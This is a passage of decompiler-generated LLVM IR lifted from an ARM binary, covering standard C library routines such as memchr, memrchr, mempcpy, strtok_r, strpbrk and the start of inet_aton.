  uselistorder label %dec_label_pc_18e9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18e30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18dd0, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_18d5c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_18d20, { 1, 0 }
  uselistorder label %dec_label_pc_18d0c, { 1, 0 }
  uselistorder label %dec_label_pc_18ccc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18c60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18bf4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18b94, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_18b08, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_18ac8, { 1, 0 }
}

define i32 @function_18f28(i32 %arg1) local_unnamed_addr {
dec_label_pc_18f28:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_18f30 = load i32, i32* @r0, align 4
  %v1_18f30 = load i32, i32* @r1, align 4
  %v2_18f30 = inttoptr i32 %v0_18f30 to i8*
  %v3_18f30 = call i32 @_memcpy(i8* %v2_18f30, i32 %v1_18f30)
  ret i32 %v3_18f30

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_18f40 = load i32, i32* @r4, align 4
  %v6_18f40 = load i32, i32* @r5, align 4
  %v9_18f40 = load i32, i32* @r6, align 4
  %v1_18f44 = urem i32 %arg1, 256
  %v0_18f6018 = load i32, i32* @r2, align 4
  %v2_18f6020 = icmp eq i32 %v0_18f6018, 0
  br i1 %v2_18f6020, label %dec_label_pc_18f70, label %dec_label_pc_18f68

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f68
  %v3_18f4c = load i8, i8* %.021, align 1
  %v4_18f4c = zext i8 %v3_18f4c to i32
  %v9_18f50 = icmp eq i32 %v4_18f4c, %v1_18f44
  %v1_18f54 = add i32 %v0_18f54, -1
  br i1 %v9_18f50, label %bb, label %dec_label_pc_18f60

bb:                                               ; preds = %dec_label_pc_18f4c
  ret i32 %v1_18f68

dec_label_pc_18f60:                               ; preds = %dec_label_pc_18f4c
  %v2_18f5c = add i32 %v1_18f68, 1
  %v3_18f5c = inttoptr i32 %v2_18f5c to i8*
  %v2_18f60 = icmp eq i32 %v1_18f54, 0
  br i1 %v2_18f60, label %dec_label_pc_18f70, label %dec_label_pc_18f68

dec_label_pc_18f68:                               ; preds = %entry, %dec_label_pc_18f60
  %v0_18f54 = phi i32 [ %v1_18f54, %dec_label_pc_18f60 ], [ %v0_18f6018, %entry ]
  %.021 = phi i8* [ %v3_18f5c, %dec_label_pc_18f60 ], [ undef, %entry ]
  %v1_18f68 = ptrtoint i8* %.021 to i32
  %v2_18f68 = urem i32 %v1_18f68, 4
  %v3_18f68 = icmp eq i32 %v2_18f68, 0
  br i1 %v3_18f68, label %dec_label_pc_18f70, label %dec_label_pc_18f4c

dec_label_pc_18f70:                               ; preds = %dec_label_pc_18f60, %dec_label_pc_18f68, %entry
  %v0_18ffc37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_18f60 ], [ %v0_18f54, %dec_label_pc_18f68 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_18f5c, %dec_label_pc_18f60 ], [ %.021, %dec_label_pc_18f68 ]
  %v4_18f70 = mul nuw nsw i32 %v1_18f44, 256
  %v5_18f70 = or i32 %v4_18f70, %v1_18f44
  %v1_18f74 = ptrtoint i8* %.0.lcssa to i32
  %v4_18f78 = mul i32 %v5_18f70, 65536
  %v5_18f78 = or i32 %v4_18f78, %v5_18f70
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_18ffc37, 3
  br i1 %tmp, label %dec_label_pc_18f80, label %dec_label_pc_19024.preheader

dec_label_pc_18f80:                               ; preds = %dec_label_pc_18f70, %dec_label_pc_18ffc.backedge
  %v0_18f9c82 = phi i32 [ %v1_18f9c, %dec_label_pc_18ffc.backedge ], [ %v0_18ffc37, %dec_label_pc_18f70 ]
  %v0_18f8081 = phi i32 [ %v4_18f80, %dec_label_pc_18ffc.backedge ], [ %v1_18f74, %dec_label_pc_18f70 ]
  %v1_18f80 = inttoptr i32 %v0_18f8081 to i32*
  %v2_18f80 = load i32, i32* %v1_18f80, align 4
  %v4_18f80 = add i32 %v0_18f8081, 4
  %v2_18f84 = xor i32 %v2_18f80, %v5_18f78
  %v2_18f88 = add i32 %v2_18f84, 2130640639
  %v1_18f8c = sub i32 -1, %v2_18f84
  %v2_18f90 = xor i32 %v2_18f88, %v1_18f8c
  %v2_18f94 = and i32 %v2_18f90, -2130640640
  %v2_18f98 = icmp eq i32 %v2_18f94, 0
  %v1_18f9c = add i32 %v0_18f9c82, -4
  br i1 %v2_18f98, label %dec_label_pc_18ffc.backedge, label %dec_label_pc_18fa4

dec_label_pc_18ffc.backedge:                      ; preds = %dec_label_pc_18f80, %dec_label_pc_18fe8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_18f9c, 3
  br i1 %tmp107, label %dec_label_pc_18f80, label %dec_label_pc_19024.preheader

dec_label_pc_18fa4:                               ; preds = %dec_label_pc_18f80
  %v2_18fa4 = inttoptr i32 %v0_18f8081 to i8*
  %v3_18fa4 = load i8, i8* %v2_18fa4, align 1
  %v4_18fa4 = zext i8 %v3_18fa4 to i32
  %v9_18fac = icmp eq i32 %v4_18fa4, %v1_18f44
  %v1_18fb0 = add i32 %v0_18f8081, 3
  %v1_18fb4 = add i32 %v0_18f8081, 1
  store i32 %v1_18fb4, i32* @lr, align 4
  %v1_18fb8 = add i32 %v0_18f8081, 2
  br i1 %v9_18fac, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_18fa4
  store i32 %v3_18f40, i32* @r4, align 4
  store i32 %v6_18f40, i32* @r5, align 4
  store i32 %v9_18f40, i32* @r6, align 4
  ret i32 %v0_18f8081

bb51:                                             ; preds = %dec_label_pc_18fa4
  %v2_18fc0 = inttoptr i32 %v1_18fb4 to i8*
  %v3_18fc0 = load i8, i8* %v2_18fc0, align 1
  %v4_18fc0 = zext i8 %v3_18fc0 to i32
  %v9_18fc4 = icmp eq i32 %v4_18fc0, %v1_18f44
  br i1 %v9_18fc4, label %dec_label_pc_18fcc, label %dec_label_pc_18fd4

dec_label_pc_18fcc:                               ; preds = %bb51
  store i32 %v3_18f40, i32* @r4, align 4
  store i32 %v6_18f40, i32* @r5, align 4
  store i32 %v9_18f40, i32* @r6, align 4
  ret i32 %v1_18fb4

dec_label_pc_18fd4:                               ; preds = %bb51
  %v2_18fd4 = inttoptr i32 %v1_18fb8 to i8*
  %v3_18fd4 = load i8, i8* %v2_18fd4, align 1
  %v4_18fd4 = zext i8 %v3_18fd4 to i32
  %v9_18fd8 = icmp eq i32 %v4_18fd4, %v1_18f44
  br i1 %v9_18fd8, label %dec_label_pc_18fe0, label %dec_label_pc_18fe8

dec_label_pc_18fe0:                               ; preds = %dec_label_pc_18fd4
  store i32 %v3_18f40, i32* @r4, align 4
  store i32 %v6_18f40, i32* @r5, align 4
  store i32 %v9_18f40, i32* @r6, align 4
  ret i32 %v1_18fb8

dec_label_pc_18fe8:                               ; preds = %dec_label_pc_18fd4
  %v2_18fe8 = inttoptr i32 %v1_18fb0 to i8*
  %v3_18fe8 = load i8, i8* %v2_18fe8, align 1
  %v4_18fe8 = zext i8 %v3_18fe8 to i32
  %v9_18fec = icmp eq i32 %v4_18fe8, %v1_18f44
  br i1 %v9_18fec, label %dec_label_pc_18ff4, label %dec_label_pc_18ffc.backedge

dec_label_pc_18ff4:                               ; preds = %dec_label_pc_18fe8
  store i32 %v3_18f40, i32* @r4, align 4
  store i32 %v6_18f40, i32* @r5, align 4
  store i32 %v9_18f40, i32* @r6, align 4
  ret i32 %v1_18fb0

dec_label_pc_19024.preheader:                     ; preds = %dec_label_pc_18ffc.backedge, %dec_label_pc_18f70
  %v0_18f80.lcssa = phi i32 [ %v1_18f74, %dec_label_pc_18f70 ], [ %v4_18f80, %dec_label_pc_18ffc.backedge ]
  %v0_18f9c.lcssa = phi i32 [ %v0_18ffc37, %dec_label_pc_18f70 ], [ %v1_18f9c, %dec_label_pc_18ffc.backedge ]
  %v2_1902411 = icmp eq i32 %v0_18f9c.lcssa, 0
  br i1 %v2_1902411, label %dec_label_pc_1902c, label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_19024, %dec_label_pc_19024.preheader
  %v0_19024.in = phi i32 [ %v0_19024, %dec_label_pc_19024 ], [ %v0_18f9c.lcssa, %dec_label_pc_19024.preheader ]
  %v15_1901c = phi i32 [ %v1_19020, %dec_label_pc_19024 ], [ %v0_18f80.lcssa, %dec_label_pc_19024.preheader ]
  %v0_19024 = add i32 %v0_19024.in, -1
  %v1_19014 = inttoptr i32 %v15_1901c to i8*
  %v2_19014 = load i8, i8* %v1_19014, align 1
  %v3_19014 = zext i8 %v2_19014 to i32
  %v9_19018 = icmp eq i32 %v3_19014, %v1_18f44
  br i1 %v9_19018, label %bb52, label %dec_label_pc_19024

bb52:                                             ; preds = %dec_label_pc_19014
  store i32 %v3_18f40, i32* @r4, align 4
  store i32 %v6_18f40, i32* @r5, align 4
  store i32 %v9_18f40, i32* @r6, align 4
  ret i32 %v15_1901c

dec_label_pc_19024:                               ; preds = %dec_label_pc_19014
  %v1_19020 = add i32 %v15_1901c, 1
  %v2_19024 = icmp eq i32 %v0_19024, 0
  br i1 %v2_19024, label %dec_label_pc_1902c, label %dec_label_pc_19014

dec_label_pc_1902c:                               ; preds = %dec_label_pc_19024, %dec_label_pc_19024.preheader
  store i32 %v3_18f40, i32* @r4, align 4
  store i32 %v6_18f40, i32* @r5, align 4
  store i32 %v9_18f40, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1901c, { 1, 0, 2 }
  uselistorder i32 %v1_18f9c, { 1, 0, 2 }
  uselistorder i32 %v0_18f8081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_18f70, { 1, 0 }
  uselistorder i32 %v0_18ffc37, { 1, 2, 0 }
  uselistorder i32 %v1_18f44, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_18f40, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18ffc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18f80, { 1, 0 }
  uselistorder label %dec_label_pc_18f70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18f68, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19048 = call i32 @memcpy()
  %v0_1904c = load i32, i32* @r5, align 4
  %v1_1904c = load i32, i32* @r4, align 4
  %v2_1904c = add i32 %v1_1904c, %v0_1904c
  ret i32 %v2_1904c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_19054 = load i32, i32* @r4, align 4
  %v1_19058 = urem i32 %arg2, 256
  %v2_1905c = add i32 %arg3, %arg1
  %v2_190742 = icmp eq i32 %arg3, 0
  br i1 %v2_190742, label %dec_label_pc_19084, label %dec_label_pc_1907c

dec_label_pc_19064:                               ; preds = %dec_label_pc_1907c
  %v1_19064 = add i32 %v0_19064, -1
  %v2_19064 = inttoptr i32 %v1_19064 to i8*
  %v3_19064 = load i8, i8* %v2_19064, align 1
  %v4_19064 = zext i8 %v3_19064 to i32
  %v9_19068 = icmp eq i32 %v4_19064, %v1_19058
  br i1 %v9_19068, label %bb, label %dec_label_pc_19074

bb:                                               ; preds = %dec_label_pc_19064
  ret i32 %v1_19064

dec_label_pc_19074:                               ; preds = %dec_label_pc_19064
  %v1_19070 = add i32 %v0_19070, -1
  %v2_19074 = icmp eq i32 %v1_19070, 0
  br i1 %v2_19074, label %dec_label_pc_19084, label %dec_label_pc_1907c

dec_label_pc_1907c:                               ; preds = %entry, %dec_label_pc_19074
  %v0_19070 = phi i32 [ %v1_19070, %dec_label_pc_19074 ], [ %arg3, %entry ]
  %v0_19064 = phi i32 [ %v1_19064, %dec_label_pc_19074 ], [ %v2_1905c, %entry ]
  %v1_1907c = urem i32 %v0_19064, 4
  %v2_1907c = icmp eq i32 %v1_1907c, 0
  br i1 %v2_1907c, label %dec_label_pc_19084, label %dec_label_pc_19064

dec_label_pc_19084:                               ; preds = %dec_label_pc_19074, %dec_label_pc_1907c, %entry
  %v0_1911c11 = phi i32 [ %v2_1905c, %entry ], [ %v1_19064, %dec_label_pc_19074 ], [ %v0_19064, %dec_label_pc_1907c ]
  %v0_191087 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_19074 ], [ %v0_19070, %dec_label_pc_1907c ]
  %v4_19084 = mul nuw nsw i32 %v1_19058, 256
  %v5_19084 = or i32 %v4_19084, %v1_19058
  %v4_19088 = mul i32 %v5_19084, 65536
  %v5_19088 = or i32 %v4_19088, %v5_19084
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_191087, 3
  br i1 %tmp, label %dec_label_pc_19090, label %dec_label_pc_19118

dec_label_pc_19090:                               ; preds = %dec_label_pc_19084, %.backedge.backedge
  %v0_190ac51 = phi i32 [ %v1_190ac, %.backedge.backedge ], [ %v0_191087, %dec_label_pc_19084 ]
  %v0_1909050 = phi i32 [ %v1_19090, %.backedge.backedge ], [ %v0_1911c11, %dec_label_pc_19084 ]
  %v1_19090 = add i32 %v0_1909050, -4
  %v2_19090 = inttoptr i32 %v1_19090 to i32*
  %v3_19090 = load i32, i32* %v2_19090, align 4
  %v2_19094 = xor i32 %v3_19090, %v5_19088
  %v2_19098 = add i32 %v2_19094, 2130640639
  %v1_1909c = sub i32 -1, %v2_19094
  %v2_190a0 = xor i32 %v2_19098, %v1_1909c
  %v2_190a4 = and i32 %v2_190a0, -2130640640
  %v2_190a8 = icmp eq i32 %v2_190a4, 0
  %v1_190ac = add i32 %v0_190ac51, -4
  br i1 %v2_190a8, label %.backedge.backedge, label %dec_label_pc_190b4

dec_label_pc_190b4:                               ; preds = %dec_label_pc_19090
  %v1_190b4 = add i32 %v0_1909050, -1
  %v2_190b4 = inttoptr i32 %v1_190b4 to i8*
  %v3_190b4 = load i8, i8* %v2_190b4, align 1
  %v4_190b4 = zext i8 %v3_190b4 to i32
  %v9_190b8 = icmp eq i32 %v4_190b4, %v1_19058
  %v1_190bc = add i32 %v0_1909050, -2
  %v1_190c4 = add i32 %v0_1909050, -3
  store i32 %v1_190c4, i32* @lr, align 4
  br i1 %v9_190b8, label %dec_label_pc_190cc, label %dec_label_pc_190d4

dec_label_pc_190cc:                               ; preds = %dec_label_pc_190b4
  store i32 %v3_19054, i32* @r4, align 4
  ret i32 %v1_190b4

dec_label_pc_190d4:                               ; preds = %dec_label_pc_190b4
  %v2_190d4 = inttoptr i32 %v1_190bc to i8*
  %v3_190d4 = load i8, i8* %v2_190d4, align 1
  %v4_190d4 = zext i8 %v3_190d4 to i32
  %v9_190d8 = icmp eq i32 %v4_190d4, %v1_19058
  br i1 %v9_190d8, label %dec_label_pc_190e0, label %dec_label_pc_190e8

dec_label_pc_190e0:                               ; preds = %dec_label_pc_190d4
  store i32 %v3_19054, i32* @r4, align 4
  ret i32 %v1_190bc

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190d4
  %v2_190e8 = inttoptr i32 %v1_190c4 to i8*
  %v3_190e8 = load i8, i8* %v2_190e8, align 1
  %v4_190e8 = zext i8 %v3_190e8 to i32
  %v9_190ec = icmp eq i32 %v4_190e8, %v1_19058
  br i1 %v9_190ec, label %dec_label_pc_190f4, label %dec_label_pc_190fc

dec_label_pc_190f4:                               ; preds = %dec_label_pc_190e8
  store i32 %v3_19054, i32* @r4, align 4
  ret i32 %v1_190c4

dec_label_pc_190fc:                               ; preds = %dec_label_pc_190e8
  %v1_190fc = inttoptr i32 %v1_19090 to i8*
  %v2_190fc = load i8, i8* %v1_190fc, align 1
  %v3_190fc = zext i8 %v2_190fc to i32
  %v9_19100 = icmp eq i32 %v3_190fc, %v1_19058
  br i1 %v9_19100, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_190fc, %dec_label_pc_19090
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_190ac, 3
  br i1 %tmp70, label %dec_label_pc_19090, label %dec_label_pc_19118

bb19:                                             ; preds = %dec_label_pc_190fc
  store i32 %v3_19054, i32* @r4, align 4
  ret i32 %v1_19090

dec_label_pc_1911c:                               ; preds = %dec_label_pc_19118
  %v1_19128 = add i32 %v0_19128, -1
  %v1_1911c = add i32 %v0_1911c, -1
  %v2_1911c = inttoptr i32 %v1_1911c to i8*
  %v3_1911c = load i8, i8* %v2_1911c, align 1
  %v4_1911c = zext i8 %v3_1911c to i32
  %v9_19120 = icmp eq i32 %v4_1911c, %v1_19058
  br i1 %v9_19120, label %bb20, label %dec_label_pc_19118

bb20:                                             ; preds = %dec_label_pc_1911c
  store i32 %v3_19054, i32* @r4, align 4
  ret i32 %v1_1911c

dec_label_pc_19118:                               ; preds = %dec_label_pc_19084, %.backedge.backedge, %dec_label_pc_1911c
  %v0_1911c = phi i32 [ %v1_1911c, %dec_label_pc_1911c ], [ %v0_1911c11, %dec_label_pc_19084 ], [ %v1_19090, %.backedge.backedge ]
  %v0_19128 = phi i32 [ %v1_19128, %dec_label_pc_1911c ], [ %v0_191087, %dec_label_pc_19084 ], [ %v1_190ac, %.backedge.backedge ]
  %v2_19128 = icmp eq i32 %v0_19128, 0
  br i1 %v2_19128, label %dec_label_pc_19130, label %dec_label_pc_1911c

dec_label_pc_19130:                               ; preds = %dec_label_pc_19118
  store i32 %v3_19054, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_19128, { 1, 0 }
  uselistorder i32 %v1_190ac, { 1, 0, 2 }
  uselistorder i32 %v1_19090, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1909050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19084, { 1, 0 }
  uselistorder i32 %v0_191087, { 1, 2, 0 }
  uselistorder i32 %v0_19064, { 1, 0, 2 }
  uselistorder i32 %v1_19064, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1905c, { 1, 0 }
  uselistorder i32 %v1_19058, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_19054, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19118, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19090, { 1, 0 }
  uselistorder label %dec_label_pc_19084, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1907c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19140 = load i32, i32* @r4, align 4
  store i32 %v3_19140, i32* %stack_var_-16, align 4
  %v6_19140 = load i32, i32* @r5, align 4
  %v0_19144 = load i32, i32* @r0, align 4
  store i32 %v0_19144, i32* %r4.global-to-local, align 4
  %v2_19144 = icmp eq i32 %v0_19144, 0
  %v1_19148 = load i32, i32* @r2, align 4
  br i1 %v2_19144, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_19148 = inttoptr i32 %v1_19148 to i32*
  %v3_19148 = load i32, i32* %v2_19148, align 4
  store i32 %v3_19148, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1914c = phi i32 [ %v3_19148, %bb ], [ %v0_19144, %entry ]
  store i32 %v0_1914c, i32* @r0, align 4
  store i32 %v1_19148, i32* @r5, align 4
  %v0_19154 = load i32, i32* @r1, align 4
  store i32 %v0_19154, i32* %r6.global-to-local, align 4
  %v1_19158 = inttoptr i32 %v0_1914c to i8*
  %v2_19158 = call i32 @__GI_strspn(i8* %v1_19158)
  %v0_1915c = load i32, i32* %r4.global-to-local, align 4
  %v2_1915c = add i32 %v0_1915c, %v2_19158
  %v3_1915c = inttoptr i32 %v2_1915c to i8*
  %v4_1915c = load i8, i8* %v3_1915c, align 1
  %v6_1915c = zext i8 %v4_1915c to i32
  store i32 %v6_1915c, i32* %r3.global-to-local, align 4
  store i32 %v2_1915c, i32* @r4, align 4
  %v2_19164 = icmp eq i8 %v4_1915c, 0
  store i1 %v2_19164, i1* @cpsr_z, align 1
  %v0_19168 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19168, i32* @r1, align 4
  store i32 %v2_1915c, i32* @r0, align 4
  br i1 %v2_19164, label %bb7, label %dec_label_pc_19178

bb7:                                              ; preds = %entry._crit_edge
  %v2_19170 = load i32, i32* @r5, align 4
  %v3_19170 = inttoptr i32 %v2_19170 to i32*
  store i32 %v2_1915c, i32* %v3_19170, align 4
  br label %dec_label_pc_191ac

dec_label_pc_19178:                               ; preds = %entry._crit_edge
  %v0_19178 = call i32 @__GI_strpbrk()
  store i32 %v0_19178, i32* %r2.global-to-local, align 4
  %v3_1917c = icmp eq i32 %v0_19178, 0
  store i1 %v3_1917c, i1* @cpsr_z, align 1
  br i1 %v3_1917c, label %dec_label_pc_1918c, label %dec_label_pc_1919c

dec_label_pc_1918c:                               ; preds = %dec_label_pc_19178
  %v0_19184 = load i32, i32* @r4, align 4
  %v2_1918c = call i32 @rawmemchr(i32 %v0_19184, i32 0)
  %v0_19190 = load i32, i32* @r4, align 4
  store i32 %v0_19190, i32* %r3.global-to-local, align 4
  %v1_19194 = load i32, i32* @r5, align 4
  %v2_19194 = inttoptr i32 %v1_19194 to i32*
  store i32 %v2_1918c, i32* %v2_19194, align 4
  br label %dec_label_pc_191ac

dec_label_pc_1919c:                               ; preds = %dec_label_pc_19178
  %v3_191a0 = inttoptr i32 %v0_19178 to i8*
  store i8 0, i8* %v3_191a0, align 1
  %v4_191a0 = load i32, i32* %r2.global-to-local, align 4
  %v5_191a0 = add i32 %v4_191a0, 1
  store i32 %v5_191a0, i32* %r2.global-to-local, align 4
  %v1_191a4 = load i32, i32* @r5, align 4
  %v2_191a4 = inttoptr i32 %v1_191a4 to i32*
  store i32 %v5_191a0, i32* %v2_191a4, align 4
  %v0_191a8 = load i32, i32* @r4, align 4
  store i32 %v0_191a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_191ac

dec_label_pc_191ac:                               ; preds = %bb7, %dec_label_pc_1918c, %dec_label_pc_1919c
  %v0_191ac = load i32, i32* %r3.global-to-local, align 4
  %v2_191b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_191b0, i32* @r4, align 4
  store i32 %v6_19140, i32* @r5, align 4
  ret i32 %v0_191ac

; uselistorder directives
  uselistorder i32 %v0_1914c, { 1, 0 }
  uselistorder i32 %v0_19144, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_191ac, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_191b4 = load i32, i32* @r0, align 4
  %v1_191d82 = inttoptr i32 %v0_191b4 to i8*
  %v2_191d83 = load i8, i8* %v1_191d82, align 1
  %v3_191d84 = zext i8 %v2_191d83 to i32
  %v2_191dc5 = icmp eq i8 %v2_191d83, 0
  br i1 %v2_191dc5, label %dec_label_pc_191d8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_191e4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_191bc:                               ; preds = %dec_label_pc_191c4
  %v1_191cc = add i32 %v0_191cc, 1
  %v9_191bc = icmp eq i32 %v3_191c4, %v3_191d86
  br i1 %v9_191bc, label %dec_label_pc_191ec, label %dec_label_pc_191c4

dec_label_pc_191c4:                               ; preds = %dec_label_pc_191bc, %bb
  %v0_191cc = phi i32 [ %v1_191cc, %dec_label_pc_191bc ], [ %v0_191e4.pre, %bb ]
  %v1_191c4 = inttoptr i32 %v0_191cc to i8*
  %v2_191c4 = load i8, i8* %v1_191c4, align 1
  %v3_191c4 = zext i8 %v2_191c4 to i32
  store i32 %v3_191c4, i32* @ip, align 4
  %v2_191c8 = icmp eq i8 %v2_191c4, 0
  br i1 %v2_191c8, label %dec_label_pc_191d4, label %dec_label_pc_191bc

dec_label_pc_191d4:                               ; preds = %dec_label_pc_191c4
  %v1_191d4 = add i32 %v0_191d4, 1
  %v1_191d8 = inttoptr i32 %v1_191d4 to i8*
  %v2_191d8 = load i8, i8* %v1_191d8, align 1
  %v3_191d8 = zext i8 %v2_191d8 to i32
  %v2_191dc = icmp eq i8 %v2_191d8, 0
  br i1 %v2_191dc, label %dec_label_pc_191d8._crit_edge, label %bb

dec_label_pc_191d8._crit_edge:                    ; preds = %dec_label_pc_191d4, %entry
  %v3_191d8.lcssa = phi i32 [ %v3_191d84, %entry ], [ %v3_191d8, %dec_label_pc_191d4 ]
  ret i32 %v3_191d8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_191d4
  %v0_191d4 = phi i32 [ %v0_191b4, %.lr.ph ], [ %v1_191d4, %dec_label_pc_191d4 ]
  %v3_191d86 = phi i32 [ %v3_191d84, %.lr.ph ], [ %v3_191d8, %dec_label_pc_191d4 ]
  br label %dec_label_pc_191c4

dec_label_pc_191ec:                               ; preds = %dec_label_pc_191bc
  ret i32 %v0_191d4

; uselistorder directives
  uselistorder i32 %v3_191d8, { 1, 0 }
  uselistorder i32 %v3_191c4, { 1, 0 }
  uselistorder i32 %v0_191cc, { 1, 0 }
  uselistorder i32 %v3_191d84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_191c4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_191f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_191f4 = icmp eq i32 %v0_191f4, 0
  %v3_191f8 = load i32, i32* @r4, align 4
  store i32 %v3_191f8, i32* %stack_var_-20, align 4
  br i1 %v2_191f4, label %dec_label_pc_192d4, label %dec_label_pc_19210.lr.ph

dec_label_pc_19210:                               ; preds = %dec_label_pc_19210.lr.ph, %dec_label_pc_19294
  %v1_19294 = phi i32 [ 0, %dec_label_pc_19210.lr.ph ], [ %v5_19294, %dec_label_pc_19294 ]
  %v0_19298 = phi i32 [ 1, %dec_label_pc_19210.lr.ph ], [ %v1_19298, %dec_label_pc_19294 ]
  %v0_19218 = phi i32 [ %v0_191f4, %dec_label_pc_19210.lr.ph ], [ %v0_1921825, %dec_label_pc_19294 ]
  store i32 %v2_19214.pre, i32* @lr, align 4
  %v1_19218 = inttoptr i32 %v0_19218 to i8*
  %v2_19218 = load i8, i8* %v1_19218, align 1
  %v3_19218 = zext i8 %v2_19218 to i32
  %v3_1921c = mul nuw nsw i32 %v3_19218, 2
  %v4_1921c = add i32 %v3_1921c, %v2_19214.pre
  %v5_1921c = inttoptr i32 %v4_1921c to i8*
  %v6_1921c = load i8, i8* %v5_1921c, align 1
  %v1_19220 = and i8 %v6_1921c, 8
  %v2_19220 = icmp eq i8 %v1_19220, 0
  br i1 %v2_19220, label %dec_label_pc_192d4, label %dec_label_pc_19228

dec_label_pc_19228:                               ; preds = %dec_label_pc_19210
  br label %dec_label_pc_19248

dec_label_pc_19230:                               ; preds = %dec_label_pc_19248
  %v3_19234 = mul i32 %v0_19294, 10
  %v4_19234 = add i32 %v3_19248, %v3_19234
  %v1_19238 = add i32 %v4_19234, -48
  %v8_19240 = icmp sgt i32 %v1_19238, 255
  br i1 %v8_19240, label %dec_label_pc_192d4, label %dec_label_pc_19244

dec_label_pc_19244:                               ; preds = %dec_label_pc_19230
  %v1_19244 = add i32 %v0_19284, 1
  store i32 %v1_19244, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19248

dec_label_pc_19248:                               ; preds = %dec_label_pc_19228, %dec_label_pc_19244
  %v0_19294 = phi i32 [ 0, %dec_label_pc_19228 ], [ %v1_19238, %dec_label_pc_19244 ]
  %v0_19284 = phi i32 [ %v0_19218, %dec_label_pc_19228 ], [ %v1_19244, %dec_label_pc_19244 ]
  %v1_19248 = inttoptr i32 %v0_19284 to i8*
